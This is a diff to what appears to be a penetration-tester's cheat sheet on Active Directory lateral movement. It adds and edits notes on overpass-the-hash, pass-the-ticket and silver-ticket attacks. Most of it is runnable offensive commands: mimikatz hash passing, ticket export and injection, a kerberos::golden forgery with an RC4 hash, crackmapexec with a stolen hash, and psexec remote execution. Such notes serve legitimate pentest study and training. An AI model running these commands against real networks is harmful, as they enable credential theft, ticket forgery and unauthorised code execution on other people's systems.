@@ -244,6 +244,7 @@ $ crackmapexec smb [target] -u [username] -H [hash] -x "whoami"
 * Requirement: user/service account to have local admin on target machine.
 * Useful when Kerberos is the only authentication mechanism allowed in a target (NTLM authN disabled).
 * `psexec.exe` requires local admin rights as it accesses admin$ share.
+* NOTE: We can only use the TGT on the machine it was created for.
 
 OPTH via. COMPROMISED HOST
 ```powershell
@@ -257,7 +258,7 @@ mimikatz > sekurlsa::pth               # create new PS process in context of tar
 
 # (new PS window, but on same host)
 PS> klist # should show no TGT/TGS
-PS> net use \\dc01                     # generate TGT by authN to network share on the DC
+PS> net use \\dc01 (try other comps/targets) # generate TGT by authN to network share on the computer
 PS> klist # now should show TGT/TGS
 PS> .\PsExec.exe \\[computer] cmd.exe  # use TGT to perform code exec against
                                        # target which user has permissions on.
@@ -284,16 +285,18 @@ $ python wmiexec.py <domain_name>/<user_name>@<remote_hostname> -k -no-pass
 ```
 
 ### Pass-the-Ticket
-* We authenticate as a user on a target host via. their Kerberos TGT rather than using their NTLM hash.
 
-PTT via. COMPROMISED HOST
+Pass-the-Ticket takes advantage of the TGS by exporting service tickets, injecting them into memory (on target) or caching as environment variable (on Kali) and then authenticating with the injected/cached ticket via. Kerberos-based authN as opposed to NTLM-based authN.
+* This attack does not require the service/user to have local admin rights on the target.
+
+PTT via. COMPROMISED HOST (exporting -> inject into memory -> psexec.exe)
 ```powershell
 mimikatz> sekurlsa::tickets /export          # export tickets
 mimikatz> kerberos::ptt [ticket_name.kirbi]  # inject into memory
 cmd> psexec.exe \\target.hostname.com cmd    # authN to remote target using ticket
 ```
 
-PTT via. KALI
+PTT via. KALI (exporting -> cache as env var -> psexec.py/smbexec.py/wmiexec.py)
 ```bash
 # export tickets -> copy to Kali
 mimikatz> sekurlsa::tickets /export                             
@@ -323,7 +326,7 @@ cmd> whoami /user
 corp\offsec S-1-5-21-1602875587-2787523311-2599479668[-1103]
 
 # generate the Silver Ticket (TGS) and inject it into memory
-mimikatz > kerberos::golden /user:[user_name] /domain:[domain_name] /sid:[sid_value] 
+mimikatz > kerberos::golden /user:[user_name] /domain:[domain_name].com /sid:[sid_value] 
         /target:[service_hostname] /service:[service_type] /rc4:[hash] /ptt
         
 # abuse Silver Ticket (TGS)
